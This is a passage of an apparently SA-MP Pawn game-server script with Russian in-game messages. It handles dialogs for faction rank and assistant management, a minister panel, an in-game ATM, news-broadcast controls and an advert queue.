			if(PlayerInfo[playerd][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
			DeletePVar(playerid, "PlayerRank");
			PlayerInfo[playerd][pRank] = listitem+1;
			SendMes(playerd,COLOR_BLUE,"Администратор %s повысил/понизил ваш ранг. Сейчас вы: %s",PlayerInfo[playerid][pSendername],FracRank[PlayerInfo[playerd][pMember]][PlayerInfo[playerd][pRank]]);
			SendMes(playerid,COLOR_ORANGE,"Вы повысили/понизили ранг %s. Сейчас он/она: %s",sendername(playerd), FracRank[PlayerInfo[playerd][pMember]][PlayerInfo[playerd][pRank]]);
		}
	case D_FRACMENU+3:
		{
			new playerd = GetPVarInt(playerid, "PlayerLeader");
			if(!response) { DeletePVar(playerid, "PlayerLeader"); return true; }
			if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(PlayerInfo[playerd][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
			if(PlayerInfo[playerd][pMember] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
			SendMes(playerid,COLOR_ORANGE,"Вы предложили %s присоединиться к \"%s\"",sendername(playerd), FracInfo[listitem+1][fName]);
			format(string,128,"Администратор %s предлагает вам присоединиться к \"%s\"\n\nВы согласны?",PlayerInfo[playerid][pSendername], FracInfo[listitem+1][fName]);
			SendMes(playerd,COLOR_BLUE,"Администратор %s предлагает вам присоединиться к \"%s\"",PlayerInfo[playerid][pSendername], FracInfo[listitem+1][fName]);
			SetPVarInt(playerd, "PlayerInvite", playerid);
			SetPVarInt(playerd, "PlayerInviteAdmin", listitem+1);
			ShowPlayerDialog(playerd, D_INVITEFRAC+1, 0, "Фракция",string,"Да","Нет");
		}
	case D_FRACMENU+4:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					if(!strcmp(FracInfo[PlayerInfo[playerid][pMember]][fAssistant], "None",true)) ShowPlayerDialog(playerid, D_FRACMENU+5, 1, "Заместитель", "Введите ID или имя игрока:", "Принять", "Отмена");
					else
					{
						format(string, 90, "Вы хотите снять с должности заместителя: %s\n\nВы согласны?",FracInfo[PlayerInfo[playerid][pMember]][fAssistant]);
						ShowPlayerDialog(playerid, D_FRACMENU+6, 0, "Заместитель", string, "Да", "Нет");
					}
				}
			default:
				{
					new lisname[10];
					switch(listitem)
					{
					case 1: lisname = "принимать";
					case 2: lisname = "уволнять";
					case 3: lisname = "повышать";
					case 4: lisname = "понижать";
					}
					if(!strcmp(FracInfo[PlayerInfo[playerid][pMember]][fAssistant], "None",true)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны установить заместителя!");
					//
					if(FracInfo[PlayerInfo[playerid][pMember]][fHelper][listitem-1] == 0) FracInfo[PlayerInfo[playerid][pMember]][fHelper][listitem-1] = 1;
					else FracInfo[PlayerInfo[playerid][pMember]][fHelper][listitem-1] = 0;
					SendMes(playerid, COLOR_BLUE, "Разрешение %s для %s: %s", lisname,FracInfo[PlayerInfo[playerid][pMember]][fAssistant], (FracInfo[PlayerInfo[playerid][pMember]][fHelper][listitem-1]) ? ("Да") : ("Нет"));
					format(FracInfo[PlayerInfo[playerid][pMember]][fHelpers], 16, "%d, %d, %d, %d, %d",
					FracInfo[PlayerInfo[playerid][pMember]][fHelper][0],
					FracInfo[PlayerInfo[playerid][pMember]][fHelper][1],
					FracInfo[PlayerInfo[playerid][pMember]][fHelper][2],
					FracInfo[PlayerInfo[playerid][pMember]][fHelper][3],
					FracInfo[PlayerInfo[playerid][pMember]][fHelper][4]);
					SetFractionStr(PlayerInfo[playerid][pMember], "helper", FracInfo[PlayerInfo[playerid][pMember]][fHelpers]);
				}
			}
		}
	case D_FRACMENU+5:
		{
			if(!response) return true;
			new playerd;
			if(sscanf(inputtext, "u",playerd)) return ShowPlayerDialog(playerid, D_FRACMENU+5, 1, "Заместитель", "Введите ID или имя игрока:", "Принять", "Отмена");
			if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(PlayerInfo[playerd][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
			if(PlayerInfo[playerd][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
			if(PlayerInfo[playerd][pMember] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
			strmid(FracInfo[PlayerInfo[playerid][pMember]][fAssistant],sendername(playerd),0,strlen(sendername(playerd)),MAX_PLAYER_NAME);
			SetFractionStr(PlayerInfo[playerid][pMember], "assistant", sendername(playerd));
			SendMes(playerid, COLOR_BLUE, "Вы назначили заместителя: %s", sendername(playerd));
			SendMes(playerd, COLOR_BLUE, "%s %s назначил вас заместителем: %s",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername], FracInfo[PlayerInfo[playerid][pMember]][fName]);
		}
	case D_FRACMENU+6:
		{
			if(!response) return true;
			SendMes(playerid, COLOR_BLUE, "Вы сняли с должности заместителя: %s",FracInfo[PlayerInfo[playerid][pMember]][fAssistant]);
			strmid(FracInfo[PlayerInfo[playerid][pMember]][fAssistant],"None",0,strlen("None"),MAX_PLAYER_NAME);
			SetFractionStr(PlayerInfo[playerid][pMember], "assistant", "None");
			for(new i = 0; i < 4; i++) FracInfo[PlayerInfo[playerid][pMember]][fHelper][i] = 0;
			format(FracInfo[PlayerInfo[playerid][pMember]][fHelpers], 16, "%d, %d, %d, %d, %d",
			FracInfo[PlayerInfo[playerid][pMember]][fHelper][0],
			FracInfo[PlayerInfo[playerid][pMember]][fHelper][1],
			FracInfo[PlayerInfo[playerid][pMember]][fHelper][2],
			FracInfo[PlayerInfo[playerid][pMember]][fHelper][3],
			FracInfo[PlayerInfo[playerid][pMember]][fHelper][4]);
			SetFractionStr(PlayerInfo[playerid][pMember], "helper", FracInfo[PlayerInfo[playerid][pMember]][fHelpers]);
		}
	case D_MFRAC:
		{
			if(response)
			{
				switch(listitem)
				{
				case 0:
					{
						SendMes(playerid, 0x33AAFFFF, "Члены организации \"%s\" в сети:", FracInfo[GetPVarInt(playerid, "MinisterFrac")][fName]);
						foreach(new i:Player)
						{
							if(IsPlayerConnected(i) == 1 && PlayerInfo[i][pMember] == GetPVarInt(playerid, "MinisterFrac")) SendMes(playerid, COLOR_WHITE, "%s ранг: %s",PlayerInfo[i][pSendername], FracRank[PlayerInfo[i][pMember]][PlayerInfo[i][pRank]]);
						}
					}
				default: ShowPlayerDialog(playerid, D_MFRAC+listitem+1, 1, "Панель", "Введите ID или имя игрока:", "Принять", "Отмена");

				}
			}
			else DeletePVar(playerid, "MinisterFrac");
		}
	case D_MFRAC+1:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: SetPVarInt(playerid, "MinisterFrac", F_POLICE_LS);
			case 1: SetPVarInt(playerid, "MinisterFrac", F_POLICE_SF);
			case 2: SetPVarInt(playerid, "MinisterFrac", F_FBI);
			case 3: SetPVarInt(playerid, "MinisterFrac", F_ARMY);
			case 4: SetPVarInt(playerid, "MinisterFrac", F_HOSPITAL);
			}
			ShowPlayerDialog(playerid, D_MFRAC, 2, "Панель", MinisterText, "Принять", "Отмена");
		}
	case D_MFRAC+2:
		{
			if(response)
			{
				new playerd;
				if(sscanf(inputtext, "u",playerd)) return ShowPlayerDialog(playerid, D_MFRAC+2, 1, "Панель", "Введите ID или имя игрока:", "Принять", "Отмена");
				if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
				if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
				if(PlayerInfo[playerd][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
				if(PlayerInfo[playerd][pMember] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
				SendMes(playerid,COLOR_BLUE,"Вы предложили %s присоединиться к \"%s\"", sendername(playerd), FracInfo[GetPVarInt(playerid, "MinisterFrac")][fName]);
				format(string,128,"%s %s предлагает вам присоединиться к \"%s\"\n\nВы согласны?",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername], FracInfo[GetPVarInt(playerid, "MinisterFrac")][fName]);
				SendMes(playerd,COLOR_BLUE,"%s %s предлагает вам присоединиться к \"%s\"", FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername], FracInfo[GetPVarInt(playerid, "MinisterFrac")][fName]);
				SetPVarInt(playerd, "PlayerInvite", playerid);
				SetPVarInt(playerd, "PlayerInviteAdmin", GetPVarInt(playerid, "MinisterFrac"));
				ShowPlayerDialog(playerd, D_JOB+16, 0, "Фракция",string,"Да","Нет");
			}
			DeletePVar(playerid, "MinisterFrac");
		}
	case D_MFRAC+3:
		{
			if(response)
			{
				new playerd;
				if(sscanf(inputtext, "u",playerd)) return ShowPlayerDialog(playerid, D_MFRAC+3, 1, "Панель", "Введите ID или имя игрока:", "Принять", "Отмена");
				if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
				if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
				if(PlayerInfo[playerd][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
				if(PlayerInfo[playerd][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
				if(PlayerInfo[playerd][pMember] != GetPVarInt(playerid, "MinisterFrac")) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
				SendMes(playerid, COLOR_BLUE, "Вы уволили %s из организации \"%s\"",sendername(playerd),FracInfo[GetPVarInt(playerid, "MinisterFrac")][fName]);
				SendMes(playerd, COLOR_BLUE, "%s %s уволил вас из организации \"%s\"", FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername],FracInfo[GetPVarInt(playerid, "MinisterFrac")][fName]);
				LeaveFractionPlayer(playerd);
			}
			DeletePVar(playerid, "MinisterFrac");
		}
	case D_MFRAC+4:
		{
			if(response)
			{
				new playerd;
				if(sscanf(inputtext, "u",playerd)) return ShowPlayerDialog(playerid, D_MFRAC+4, 1, "Панель", "Введите ID или имя игрока:", "Принять", "Отмена");
				new str[90], str2[1024], full = 0;
				if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
				if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
				if(PlayerInfo[playerd][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
				if(PlayerInfo[playerd][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
				if(PlayerInfo[playerd][pMember] != GetPVarInt(playerid, "MinisterFrac")) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
				for(new i = 1; i <= MAX_RANK; i++)
				{
					if(PlayerInfo[playerd][pMember] == F_ARMY && i == 13) break;
					if(!strcmp(FracRank[PlayerInfo[playerd][pMember]][i+1], "None",true)) break;
					format(str,sizeof(str),"Ранг №%i - %s\n",i,FracRank[PlayerInfo[playerd][pMember]][i]);
					strcat(str2, str);
					full++;
				}
				if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Ошибка! Обратитесь к администрации!");
				SetPVarInt(playerid, "PlayerRank", playerd);
				ShowPlayerDialog(playerid, D_JOB+15, 2, "Ранг", str2, "Принять", "Отмена");
			}
			DeletePVar(playerid, "MinisterFrac");
		}
	case D_ATM+9:
		{
			if(!response) return true;
			new Float:x, Float:y, Float:z, Float:angle;
			GetPlayerPos(playerid, x, y, z);
			GetPlayerFacingAngle(playerid, angle);
			x += floatsin(-angle, degrees);
			y += floatcos(-angle, degrees);
			new atm1;
			SendClientMessage(playerid, COLOR_LIGHTRED, "Чтобы выйти, нажмите: ESC и чтобы сохранить, нажмите курсором: СОХРАНИТЬ");
			atm1 = CreateObject(2754, x, y, z-0.35, 0.0, 0.0, 0.0);
			SetPVarInt(playerid, "LoadATM", atm1+1);
			EditObject(playerid, atm1);
		}
	case D_ATM+5:
		{
			if(!response) return DeletePVar(playerid, "PriceATM");
			switch(listitem)
			{
			case 0:
				{
					format(string, 90, "{ffffff}Баланс банковского счета: {9ACD32}%i{ffffff} долларов", PlayerInfo[playerid][pBank]);
					ShowPlayerDialog(playerid, D_ATM+6, 0, "Баланс", string, "Назад", "");
				}
			case 1: ShowPlayerDialog(playerid, D_ATM+7, 1, "Пополнение", "Введите сумму пополнения", "Принять", "Назад");
			case 2: ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "Введите ID или имя игрока и кол-во долларов через запятую\n\nПример: Name_Family, 10000", "Принять", "Назад");
			case 3: ShowPlayerDialog(playerid, D_ATM+8, 1, "Снятие", "Введите кол-во долларов:", "Принять", "Назад");
			case 4:
				{

					new h = GetPVarInt(playerid, "PlayerHouse");
					if(GetPlayerHouse(playerid) == 0) { SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAtHome); return BankList(playerid); }
					format(string,128,"Введите сумму пополнения\nТекущий домашний баланс: %d$",HouseInfo[h][hOplata]);
					ShowPlayerDialog(playerid, D_LIC+5, 1, "Пополнение домашнего счета", string, "Принять", "Назад");
				}
			case 5:
				{

					new b = GetPVarInt(playerid, "PlayerBizz");
					if(GetPlayerBizz(playerid) == 0) { SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!"); return BankList(playerid); }
					format(string,128,"Введите сумму пополнения\nТекущий баланс бизнеса: %d$",BizzInfo[b][bMoney]);
					ShowPlayerDialog(playerid, D_HEAL+21, 1, "Пополнение счета бизнеса", string, "Принять", "Назад");
				}
			case 6:
				{

					new b = GetPVarInt(playerid, "PlayerBizz");
					if(GetPlayerBizz(playerid) == 0) { SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!"); return BankList(playerid); }
					format(string,128,"Введите сумму вывода денег с бизнеса\nТекущий баланс бизнеса: %d$",BizzInfo[b][bMoney]);
					ShowPlayerDialog(playerid, D_HEAL+213, 1, "Вывод счета с бизнеса", string, "Принять", "Назад");
				}
			}
		}
	case D_ATM+932:
		{
			if(!response) return DeletePVar(playerid, "PriceATM");
			switch(listitem)
			{
			case 0:
				{
					format(string, 90, "{ffffff}Баланс банковского счета: {9ACD32}%i{ffffff} долларов", PlayerInfo[playerid][pBank]);
					ShowPlayerDialog(playerid, D_ATM+6, 0, "Баланс", string, "Назад", "");
				}
			case 1: ShowPlayerDialog(playerid, D_ATM+8, 1, "Снятие", "Введите сумму, которую желаете снять", "Принять", "Назад");
			case 2:
				{
					new h = GetPVarInt(playerid, "PlayerHouse");
					if(GetPlayerHouse(playerid) == 0) { SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAtHome); return BankList(playerid); }
					format(string,64,"Текущий домашний баланс: %d$",HouseInfo[h][hOplata]);
					ShowPlayerDialog(playerid, D_ATM+6, DIALOG_STYLE_MSGBOX, "Баланс домашнего счета", string, "Назад", "");
				}
			case 3:
				{
					new b = GetPVarInt(playerid, "PlayerBizz");
					if(GetPlayerBizz(playerid) == 0) { SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!"); return BankList(playerid); }
					format(string,64,"Текущий баланс бизнеса: %d$",BizzInfo[b][bMoney]);
					ShowPlayerDialog(playerid, D_ATM+6, DIALOG_STYLE_MSGBOX, "Баланс бизнес счета", string, "Назад", "");
				}
			case 4:
				{
					if(PlayerInfo[playerid][pPhone][0] == 0) { SendClientMessage(playerid, COLOR_GREY, "У вас нету телефона!"); return BankList(playerid); }
					format(string,128,"Введите сумму пополнения\nТекущий баланс телефона: %d$",PlayerInfo[playerid][pPhoneBalance]);
					ShowPlayerDialog(playerid, D_ATM+1, 1, "Пополнение счета телефона", string, "Принять", "Назад");
				}
			}
		}
	case D_ATM+6: return BankList(playerid);
	case D_ATM+7:
		{
			if(!response) return BankList(playerid);
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_ATM+7, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад");
			if(price < 1) return ShowPlayerDialog(playerid, D_ATM+7, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад");
			if(GetMoney(playerid) < price) { ShowPlayerDialog(playerid, D_ATM+7, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney); }
			SetPVarInt(playerid, "PriceATM", 0);
			PlayerInfo[playerid][pBank] += price;
			GiveMoney(playerid, -price);
			SendMes(playerid, COLOR_GREEN, "Вы положили на счет: %i долларов. На счете: %i долларов", price, PlayerInfo[playerid][pBank]);
			BankList(playerid);
			return true;
		}
	case D_ATM+8:
		{
			if(!response) return BankList(playerid);
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_ATM+8, 1, "Снятие", "Введите кол-во долларов:", "Принять", "Назад");
			if(price < 1) return ShowPlayerDialog(playerid, D_ATM+8, 1, "Снятие", "Введите кол-во долларов:", "Принять", "Назад");
			if(PlayerInfo[playerid][pBank] < price) { ShowPlayerDialog(playerid, D_ATM+8, 1, "Снятие", "Введите кол-во долларов:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank); }
			SetPVarInt(playerid, "PriceATM", 0);
			PlayerInfo[playerid][pBank] -= price;
			GiveMoney(playerid, price);
			SendMes(playerid, COLOR_GREEN, "Вы сняли со счета: %i долларов. На счете: %i долларов", price, PlayerInfo[playerid][pBank]);
			BankList(playerid);
			return true;
		}
	case D_NMENU:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					new full = 0, CB[16];
					foreach(new i:Player)
					{
						if(!IsPlayerConnected(i) || PlayerLogged[i] == 0 || playerid == i) continue;
						if(Ether[i] == true && PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember]) full++;
					}
					if(full > 0) return SendClientMessage(playerid, COLOR_GREY, "Эфир занят! В эфире находиться ваш коллега!");
					if(Ether[playerid] == false)
					{
						if(PlayerInfo[playerid][pMember] == F_UNITEDNEWS && PlayerInfo[playerid][pNews] != NEWS_UNITED) PlayerInfo[playerid][pNews] = NEWS_UNITED;
						Ether[playerid] = true;
						format(string, 90, "[F] %s вошел(а) в прямой эфир",PlayerInfo[playerid][pSendername]);
						SendFMes(PlayerInfo[playerid][pMember], 0x9ACD32FF, string);
					}
					else if(Ether[playerid] == true)
					{
						Ether[playerid] = false;
						Convert(GetPVarInt(playerid,"InEther"),CB);
						if(EtherSms[PlayerInfo[playerid][pNews]-1] == true) { format(string, 90, "[F] %s выключил прием СМС",PlayerInfo[playerid][pSendername]); SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string); }
						if(EtherCall[PlayerInfo[playerid][pNews]-1] == true) { format(string, 90, "[F] %s выключил прием звонков",PlayerInfo[playerid][pSendername]); SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string); }
						format(string, 90, "[F] %s вышел(а) из прямого эфира (Время в эфире: %s, звонков: %i, СМС: %i)",PlayerInfo[playerid][pSendername], CB, CallNews[PlayerInfo[playerid][pNews]-1], SmsNews[PlayerInfo[playerid][pNews]-1]);
						SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
						SmsNews[PlayerInfo[playerid][pNews]-1] = 0;
						CallNews[PlayerInfo[playerid][pNews]-1] = 0;
						EtherSms[PlayerInfo[playerid][pNews]-1] = false;
						EtherCall[PlayerInfo[playerid][pNews]-1] = false;
						DeletePVar(playerid, "InEther");
						if(Mobile[playerid] != -1) MobileCrash(playerid);
					}
				}
			case 1:
				{
					if(Ether[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в прямом эфире!");
					ShowPlayerDialog(playerid, D_NMENU+1, 1, "Эфир", "Введите ID или имя игрока:", "Принять", "Отмена");
				}
			case 2:
				{
					if(Ether[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в прямом эфире!");
					ShowPlayerDialog(playerid, D_NMENU+2, 1, "Эфир", "Введите ID или имя игрока:", "Принять", "Отмена");
				}
			case 3:
				{
					if(Ether[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в прямом эфире!");
					new full=0;
					switch(PlayerInfo[playerid][pMember])
					{
					case F_UNITEDNEWS: full = 0;
					}
					if(EtherCall[full] == false)
					{
						EtherCall[full] = true;
						format(string, 90, "[F] %s включил прием звонков",PlayerInfo[playerid][pSendername]);
						SendFMes(PlayerInfo[playerid][pMember], 0x9ACD32FF, string);
					}
					else
					{
						EtherCall[full] = false;
						format(string, 90, "[F] %s выключил прием звонков",PlayerInfo[playerid][pSendername]);
						SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
					}
				}
			case 4:
				{
					if(Ether[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в прямом эфире!");
					new full=0;
					switch(PlayerInfo[playerid][pMember])
					{
					case F_UNITEDNEWS: full = 0;
					}
					if(EtherSms[full] == false)
					{
						EtherSms[full] = true;
						format(string, 90, "[F] %s включил прием СМС",PlayerInfo[playerid][pSendername]);
						SendFMes(PlayerInfo[playerid][pMember], 0x9ACD32FF, string);
					}
					else
					{
						EtherSms[full] = false;
						format(string, 90, "[F] %s выключил прием СМС",PlayerInfo[playerid][pSendername]);
						SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
					}
				}
			case 5: AdvertList(playerid);
			}
		}
	case D_NMENU+1:
		{
			if(!response) return true;
			new playerd;
			if(sscanf(inputtext, "u",playerd)) ShowPlayerDialog(playerid, D_NMENU+1, 1, "Эфир", "Введите ID или имя игрока:", "Принять", "Отмена");
			if(playerd == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете пригласить себя!");
			if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(IsPlayerInAnyVehicle(playerid)&&!IsPlayerInVehicle(playerd, GetPlayerVehicleID(playerid)) || !IsPlayerInAnyVehicle(playerid) && !IsPlayerInRangeOfPlayer(10.0, playerid, playerd)) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться с вами в транспорте!");
			if(EtherLive[playerd] == true) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже в прямом эфире!");
			if(PlayerInfo[playerid][pMember] == F_UNITEDNEWS && PlayerInfo[playerd][pNews] != NEWS_UNITED) return SendMes(playerid, COLOR_GREY, "Игрок должен слушать радио: %s", FracInfo[F_UNITEDNEWS][fName]);
			EtherLive[playerd] = true;
			SetPVarInt(playerd, "Etherfrac", PlayerInfo[playerid][pMember]);
			SendMes(playerid, 0x9ACD32FF, "Вы пригласили в эфир: %s", sendername(playerd));
			SendMes(playerd, 0x9ACD32FF, "%s пригласил(а) вас в эфир", PlayerInfo[playerid][pSendername]);
		}
	case D_NMENU+2:
		{
			if(!response) return true;
			new playerd;
			if(sscanf(inputtext, "u",playerd)) ShowPlayerDialog(playerid, D_NMENU+2, 1, "Эфир", "Введите ID или имя игрока:", "Принять", "Отмена");
			if(playerd == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете выпроводить себя!");
			if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(IsPlayerInAnyVehicle(playerid)&&!IsPlayerInVehicle(playerd, GetPlayerVehicleID(playerid)) || !IsPlayerInAnyVehicle(playerid) && !IsPlayerInRangeOfPlayer(10.0, playerid, playerd)) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться с вами в транспорте!");
			if(EtherLive[playerd] == false) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в прямом эфире!");
			EtherLive[playerd] = false;
			DeletePVar(playerd, "Etherfrac");
			SendMes(playerid, COLOR_LIGHTRED, "Вы выпроводили из эфира: %s", sendername(playerd));
			SendMes(playerd, COLOR_LIGHTRED, "%s выпроводил(а) вас из эфира", PlayerInfo[playerid][pSendername]);
		}
	case D_NMENU+3:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: { PlayerInfo[playerid][pNews] = NEWS_UNITED; SendMes(playerid, COLOR_WHITE, "Вы слушаете радио: {8D8DFF}%s", FracInfo[F_UNITEDNEWS][fName]); }
			case 1: { PlayerInfo[playerid][pNews] = 0; SendClientMessage(playerid, COLOR_LIGHTRED, "Вы выключили радио"); }
			}
		}
	case D_NMENU+4:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: ShowPlayerDialog(playerid, D_NMENU+9, 1, "Панель", "Введите цену за 1 секунду в эфире:", "Принять", "Отмена");
			case 1: ShowPlayerDialog(playerid, D_NMENU+10, 1, "Панель", "Введите цену за СМС:", "Принять", "Отмена");
			case 2: ShowPlayerDialog(playerid, D_NMENU+11, 1, "Панель", "Введите цену за 1 символ объявления:", "Принять", "Отмена");
			}
		}
	case D_NMENU+5:
		{
			if(!response) return true;
			SetPVarInt(playerid, "AdvertID", listitem+1);
			ShowPlayerDialog(playerid, D_NMENU+6, 2, "Объявления", "Прочитать объявление\nРедактировать объявление\nУдалить объявление\nОтправить объявление\nОтправить администрации", "Принять", "Назад");
		}
	case D_NMENU+6:
		{
			if(!response) { DeletePVar(playerid, "AdvertID"); return AdvertList(playerid); }
			new full = 0;
			switch(PlayerInfo[playerid][pMember])
			{
			case F_UNITEDNEWS: full = 0;
			}
			switch(listitem)
			{
			case 0:
				{
					format(string, 128, "Текст: %s - Прислал: %s",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText],AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aName]);
					ShowPlayerDialog(playerid, D_NMENU+7, 0, "Объявления", string, "Назад", "");
				}
			case 1:
				{
					format(string, 128, "Текст: %s - Прислал: %s",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText],AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aName]);
					ShowPlayerDialog(playerid, D_NMENU+8, 1, "Объявления", string, "Принять", "Назад");
				}
			case 2:
				{
					/*for(new i = 1; i <= TOTALADVERT[full]; i++)
					{
						if(i <= GetPVarInt(playerid, "AdvertID")) continue;
						AdvertInfo[i][full][id]--;
					}*/
					for(new i = GetPVarInt(playerid, "AdvertID"); i <= TOTALADVERT[full] - 1; i++) memcpy(AdvertInfo[i][full], AdvertInfo[i+1][full], 0, 512);
					TOTALADVERT[full]--;
					SendClientMessage(playerid, COLOR_LIGHTRED, "Объявление удалено");
					DeletePVar(playerid, "AdvertID");
					AdvertList(playerid);
				}
			case 3:
				{
					if(AdvertTime > gettime())
					{
						DeletePVar(playerid, "AdvertID");
						SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSecAd);
						return AdvertList(playerid);
					}
					format(string, 128, "- Обьявление: %s. Прислал: %s. Телефон: %i",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText], AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aName],AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aPhone]);
					SendClientMessageToAll(TEAM_GROVE_COLOR, string);
					format(string, 128, "        Объявление проверил сотрудник %s: %s",FracInfo[PlayerInfo[playerid][pMember]][fName], PlayerInfo[playerid][pSendername]);
					SendClientMessageToAll(TEAM_GROVE_COLOR, string);
					for(new i = GetPVarInt(playerid, "AdvertID"); i <= TOTALADVERT[full] - 1; i++) memcpy(AdvertInfo[i][full], AdvertInfo[i+1][full], 0, 512);
					TOTALADVERT[full]--;
					AdvertTime = gettime() + THFREE_SECOND_FLOOD_REP;
					DeletePVar(playerid, "AdvertID");
					AdvertList(playerid);
				}
			case 4:
				{
					format(string, 128, "[A] [AD] Обьявление: %s. Прислал: %s (Отправил: %s)",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText], AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aName], PlayerInfo[playerid][pSendername]);
					SendAdminMessage(COLOR_LIGHTRED, string);
					for(new i = GetPVarInt(playerid, "AdvertID"); i <= TOTALADVERT[full] - 1; i++) memcpy(AdvertInfo[i][full], AdvertInfo[i+1][full], 0, 512);
					TOTALADVERT[full]--;
					SendClientMessage(playerid, COLOR_LIGHTRED, "Объявление отправлено администрации");
					DeletePVar(playerid, "AdvertID");
					AdvertList(playerid);
				}
			}

		}
	case D_NMENU+7: ShowPlayerDialog(playerid, D_NMENU+6, 2, "Объявления", "Прочитать объявление\nРедактировать объявление\nУдалить объявление\nОтправить объявление\nОтправить администрации", "Принять", "Назад");
	case D_NMENU+8:
		{
			if(!response) return ShowPlayerDialog(playerid, D_NMENU+6, 2, "Объявления", "Прочитать объявление\nРедактировать объявление\nУдалить объявление\nОтправить объявление\nОтправить администрации", "Принять", "Назад");
			new text[60],full = 0;
			switch(PlayerInfo[playerid][pMember])
			{
